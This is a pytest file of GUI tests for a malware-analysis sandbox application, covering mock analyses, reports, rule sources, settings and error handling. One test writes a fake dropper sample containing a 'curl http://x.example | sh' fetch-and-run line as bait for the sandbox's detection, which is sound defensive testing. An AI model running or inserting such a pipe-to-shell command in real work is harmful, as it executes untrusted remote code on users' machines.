import os
import time

import pytest

os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")
QtWidgets = pytest.importorskip("PySide6.QtWidgets")

from yemu import config as yemu_config  # noqa: E402
from yemu import paths  # noqa: E402


@pytest.fixture(scope="module")
def qapp():
    return QtWidgets.QApplication.instance() or QtWidgets.QApplication([])


def pump(app, cond, timeout=30):
    end = time.time() + timeout
    while time.time() < end:
        app.processEvents()
        if cond():
            return True
        time.sleep(0.02)
    app.processEvents()
    return cond()


@pytest.fixture
def gui(qapp, tmp_path):
    cfg = yemu_config.load()
    cfg["vm"].update(backend="mock", default_vm="mock-ubuntu")
    cfg["analysis"]["execution_wait"] = 0
    yemu_config.save(cfg)
    from yemu.gui.app import create_window

    ctx, win = create_window(qapp)
    assert pump(qapp, lambda: ctx.db_ready)
    yield qapp, ctx, win
    ctx.shutdown()
    win.deleteLater()
    qapp.processEvents()


def test_mock_analysis_end_to_end_through_gui(gui, tmp_path):
    app, ctx, win = gui
    sample = tmp_path / "dropper.sh"
    sample.write_text("curl http://x.example | sh\nencrypt decrypt .locked\n", encoding="utf-8")

    page = win.pages["analyze"]
    assert pump(app, lambda: page.snap_combo.currentText() == "clean-baseline")
    page.set_sample(str(sample))
    assert page.start_btn.isEnabled()
    page.start()
    assert pump(app, lambda: not ctx.analysis_running, 60)
    assert pump(app, lambda: not page.result_card.isHidden())  # window is never shown in tests
    assert page.tracker.state("cleanup") == "done"
    analysis_id = page.last_analysis_id

    win.nav.setCurrentRow(1)
    history = win.pages["history"]
    assert pump(app, lambda: history.model.rowCount() == 1)
    history.search.setText("nomatch")
    assert history.proxy.rowCount() == 0
    history.search.setText("dropper")
    assert history.proxy.rowCount() == 1

    win.open_report(analysis_id)
    report = win.pages["report"]
    assert pump(app, lambda: report.report is not None)
    assert report.report["verdict"] in ("suspicious", "malicious")
    assert report.yara_tree.topLevelItemCount() >= 2
    assert report.proc_tree.topLevelItemCount() == 1  # malware_sample -> curl
    assert report.b_model.rowCount() > 0
    # Raw JSON is filled when its tab is first opened, without the duplicate "behaviour" list
    assert report.raw_view.toPlainText() == ""
    report.tabs.setCurrentWidget(report.raw_view)
    assert pump(app, lambda: report.raw_view.toPlainText() != "")
    assert '"events"' in report.raw_view.toPlainText() and '"behaviour"' not in report.raw_view.toPlainText()
    # guest/sample-controlled strings must never be rendered as HTML
    from PySide6.QtCore import Qt

    assert report.title.textFormat() == Qt.TextFormat.PlainText
    assert page.result_title.textFormat() == Qt.TextFormat.PlainText

    def column(c):
        return [report.b_proxy.index(r, c).data() for r in range(report.b_proxy.rowCount())]

    times = column(0)
    assert times == sorted(times) and len(set(times)) > 1
    report.b_view.sortByColumn(0, Qt.SortOrder.DescendingOrder)
    assert column(0) == sorted(times, reverse=True)
    report.b_view.sortByColumn(1, Qt.SortOrder.AscendingOrder)
    assert column(1) == sorted(column(1))
    report.b_type.setCurrentText("network")
    assert 0 < report.b_proxy.rowCount() < report.b_model.rowCount()


def test_vms_rules_and_settings_pages(gui):
    app, ctx, win = gui
    win.nav.setCurrentRow(2)
    vms = win.pages["vms"]
    assert pump(app, lambda: vms.model.rowCount() == 2)
    assert not vms.create_btn.isEnabled()  # mock backend cannot provision

    rules = win.pages["rules"]
    rules._select_path(paths.BUILTIN_RULES_FILE)
    assert rules.editor.isReadOnly()
    rules._validate()
    assert "compiles" in rules.status.text()

    settings = win.pages["settings"]
    settings.exec_wait.setValue(7)
    settings.theme.setCurrentText("dark")
    assert not settings.repo.isEnabled()  # repo fields only apply to a custom GitHub source
    assert settings.source_list.count() == 1 and not settings.remove_source.isEnabled()
    settings.rule_source.setCurrentIndex(settings.rule_source.findData("forge:extended"))
    settings._add_source()
    assert settings.source_list.count() == 2 and settings.remove_source.isEnabled()
    settings._remove_source()  # removes the selected (last) entry
    assert [e["package"] for e in settings.sources] == ["core"]
    settings.rules_interval.setValue(3)
    settings.app_check.setChecked(False)
    settings.save()
    saved = yemu_config.load()
    assert saved["analysis"]["execution_wait"] == 7
    assert saved["ui"]["theme"] == "dark"
    assert saved["rules"]["sources"] == [{"source": "yara-forge", "package": "core", "ref": ""}]
    assert saved["rules"]["update_interval_days"] == 3
    assert saved["updates"]["check_on_startup"] is False
    assert ctx.backend.name == "mock"


def test_update_badge_and_dialog(gui):
    app, ctx, win = gui
    release = {
        "version": "9.9.9",
        "tag": "v9.9.9",
        "name": "YEMU v9.9.9",
        "url": "https://example.invalid/r",
        "notes": "<b>not html</b>",
        "published": "2026-10-01T00:00:00Z",
        "assets": {"yemu-9.9.9-py3-none-any.whl": "https://example.invalid/yemu.whl"},
    }
    ctx.update_available.emit(release)
    app.processEvents()
    assert not win.update_btn.isHidden() and "9.9.9" in win.update_btn.text()

    from yemu.gui.update_dialog import UpdateDialog

    dlg = UpdateDialog(ctx, release, win)
    assert dlg.hint.text().startswith("pip install --upgrade")  # tests run from source, not a frozen build
    assert not dlg.primary.isHidden() and dlg.primary.text() == "Copy command"
    dlg.deleteLater()


def test_settings_adds_a_github_rule_source(gui, monkeypatch):
    app, ctx, win = gui
    warnings = []
    monkeypatch.setattr(QtWidgets.QMessageBox, "warning", lambda *a: warnings.append(a[2]))
    settings = win.pages["settings"]
    settings.rule_source.setCurrentIndex(settings.rule_source.findData("forge:core"))
    settings._add_source()  # duplicate of the default source
    assert "same rule set" in warnings[-1] and settings.source_list.count() == 1
    settings.rule_source.setCurrentIndex(settings.rule_source.findData("repo"))
    settings.repo.setText("https://gitlab.com/a/b")
    settings._add_source()
    assert "Not a GitHub repository" in warnings[-1] and settings.source_list.count() == 1
    settings.repo.setText("https://github.com/Neo23x0/signature-base")
    settings.branch.setText("main")
    settings._add_source()
    assert settings.source_list.item(1).text() == "github.com/Neo23x0/signature-base (main)"
    settings.save()
    sources = yemu_config.load()["rules"]["sources"]
    assert [s["source"] for s in sources] == ["yara-forge", "github-repo"]
    assert sources[1]["repo_url"] == "https://github.com/Neo23x0/signature-base" and sources[1]["branch"] == "main"
    assert "github.com/Neo23x0/signature-base (main): never synced" in win.pages["rules"].sync_info.text()


def test_excepthook_logs_and_shows_the_error(qapp, monkeypatch, caplog):
    from yemu.gui import app as gui_app

    shown = []
    monkeypatch.setattr(QtWidgets.QMessageBox, "critical", lambda *a: shown.append(a))
    monkeypatch.delenv("YEMU_SMOKE_TEST", raising=False)
    try:
        raise ValueError("boom")
    except ValueError as e:
        gui_app.report_exception(type(e), e, e.__traceback__)
    assert any(r.exc_info and "Uncaught exception" in r.message for r in caplog.records)
    (_, title, text) = shown[0]
    assert title == "YEMU error" and text.startswith("ValueError: boom") and "yemu.log" in text

    # the packaged smoke test must fail instead of waiting on a dialog
    exits = []
    monkeypatch.setenv("YEMU_SMOKE_TEST", "1")
    monkeypatch.setattr(QtWidgets.QApplication, "exit", lambda code=0: exits.append(code))
    gui_app.report_exception(ValueError, ValueError("again"), None)
    assert exits == [1] and len(shown) == 1


def test_gui_refuses_a_broken_config_without_overwriting_it(tmp_path):
    import subprocess
    import sys

    home = tmp_path / "home"
    (home / "config").mkdir(parents=True)
    config = home / "config" / "config.toml"
    config.write_text("[ui]\ntheme = 5\n", encoding="utf-8")
    env = {**os.environ, "YEMU_HOME": str(home), "YEMU_SMOKE_TEST": "1", "YEMU_NO_UPDATE_CHECK": "1"}
    env["QT_QPA_PLATFORM"] = "offscreen"
    proc = subprocess.run([sys.executable, "-m", "yemu", "gui"], env=env, capture_output=True, timeout=60)
    assert proc.returncode == 2
    assert "[ui].theme must be a string" in (home / "data" / "logs" / "yemu.log").read_text(encoding="utf-8")
    assert config.read_text(encoding="utf-8") == "[ui]\ntheme = 5\n"


@pytest.mark.parametrize("problem", ["folder", "missing", "too big", "unreadable"])
def test_analyze_page_rejects_bad_samples_visibly(gui, tmp_path, monkeypatch, problem):
    app, ctx, win = gui
    page = win.pages["analyze"]
    assert pump(app, lambda: page.snap_combo.currentText() == "clean-baseline")
    sample = tmp_path / "sample.bin"
    sample.write_bytes(b"x" * (2 * 1024 * 1024))
    page.set_sample(str(sample))
    assert pump(app, lambda: "sha256: " in page.file_meta.text() and "computing" not in page.file_meta.text())
    assert page.start_btn.isEnabled()

    if problem == "folder":
        page.set_sample(str(tmp_path))
        expected = "not a regular file"
    elif problem == "missing":
        page.set_sample(str(tmp_path / "gone.bin"))
        expected = "Cannot use"
    elif problem == "too big":
        ctx.config["analysis"]["max_sample_mb"] = 1
        page.set_sample(str(sample))
        expected = "over the 1 MB sample limit"
    else:
        from yemu.gui.pages import analyze

        def locked(path):
            raise PermissionError(13, "Permission denied", path)

        monkeypatch.setattr(analyze, "sha256_of", locked)
        page.set_sample(str(sample))
        assert pump(app, lambda: "unreadable" in page.file_meta.text())
        expected = "sha256: unreadable ("
    assert expected in page.file_meta.text() and not page.file_card.isHidden()
    assert not page.start_btn.isEnabled()


def test_shutdown_logs_a_failed_database_close(qapp, monkeypatch, caplog):
    from yemu.gui.context import AppContext

    ctx = AppContext()

    def fail(coro, timeout=None):
        coro.close()
        raise TimeoutError("database is locked")

    monkeypatch.setattr(ctx.runner, "run", fail)
    ctx.shutdown()
    assert any(r.levelname == "WARNING" and "database is locked" in r.message for r in caplog.records)
